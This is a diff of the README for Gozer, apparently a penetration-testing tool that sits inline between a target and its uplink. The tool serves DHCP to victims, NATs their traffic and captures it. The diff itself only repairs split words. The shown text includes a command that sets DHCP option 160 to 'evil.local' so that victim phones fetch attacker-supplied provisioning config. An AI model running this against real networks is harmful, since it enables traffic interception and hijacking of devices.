@@ -1,7 +1,6 @@
 # Gozer  
   
-Gozer is an inline transparent tap that drops between a target and their uplink, stands up DHCP on the victim side, NATs everything through, and optio  
-nally captures traffic. Replaces a bunch of half-baked scripts I had lying around for doing this manually.  
+Gozer is an inline transparent tap that drops between a target and their uplink, stands up DHCP on the victim side, NATs everything through, and optionally captures traffic. Replaces a bunch of half-baked scripts I had lying around for doing this manually.  
   
 Requires two NICs. Figures out which one has the default route (uplink) and uses the other for the victim net. If it can't tell, it will ask.  
   
@@ -41,8 +40,7 @@ Similar techniques were used during a Polycom provisioning hijack (option 160) i
 sudo python3 gozer.py --dhcp-option 160:http://evil.local/cfg  
 ```  
   
-In this scenario, a victim phone grabs a DHCP lease, gets told to pull its config from your server instead of the real provisioning host. Works for an  
-y protocol that bootstraps via DHCP options.  
+In this scenario, a victim phone grabs a DHCP lease, gets told to pull its config from your server instead of the real provisioning host. Works for any protocol that bootstraps via DHCP options.  
 
 ## Recon Mode  
   
